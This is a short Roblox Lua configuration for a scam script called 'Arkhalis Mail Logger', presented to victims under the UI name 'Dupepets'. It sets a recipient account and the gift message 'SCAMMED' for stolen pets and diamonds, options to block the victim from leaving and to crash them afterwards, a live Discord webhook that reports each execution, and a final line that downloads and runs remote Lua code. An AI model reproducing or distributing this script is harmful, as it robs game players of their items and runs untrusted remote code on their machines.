--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username = "1X1NINJA1X1" --// Username To Send Pets To
_G.GiftMessage = "SCAMMED" --// Message For The Gift To Say

_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
_G.UnlockPets = true --// Unlocks Locked Pets
_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
_G.Crash = true  --// Crashes Them After Its Finished

--[[ Webhook Config ]]--
_G.Enabled = true --// Toggle For Sending Webhooks
_G.Mention = true --// Pings You When Someone Executes
_G.Webhook = "https://discord.com/api/webhooks/1097208882624999495/kZ8E_JKpIjXhaW4WjWqL-LAcgBKU958_UxYkca_DkwEqf0mqMS8YC81xkhGmV6yJ6qRN" --// Discord Webhook For Executions

--[[ UI Config ]]--
_G.ScriptName = "Dupepets" --// Script Name On The UI
_G.Tip1 = "DONT LEAVE" --// Gives You Tips On The UI
_G.Tip2 = "DONT LEAVE" --// Gives You Tips On The UI
_G.Tip3 = "DONT LEAVE" --// Gives You Tips On The UI
_G.Tip4 = "DONT LEAVE" --// Gives You Tips On The UI
_G.Tip5 = "DONT LEAVE" --// Gives You Tips On The UI

--[[ Script ]]
loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
